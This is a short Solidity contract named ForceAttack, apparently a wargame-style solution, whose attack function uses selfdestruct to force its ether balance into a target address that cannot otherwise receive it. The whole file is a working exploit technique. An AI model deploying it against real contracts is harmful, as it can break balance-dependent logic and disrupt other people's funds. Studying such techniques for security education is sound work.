pragma solidity >=0.6.4 <0.8.0;

contract ForceAttack {

  constructor() public payable {}
  fallback() external payable {}

  function attack(address payable target) public {
    selfdestruct(target);
  }
}
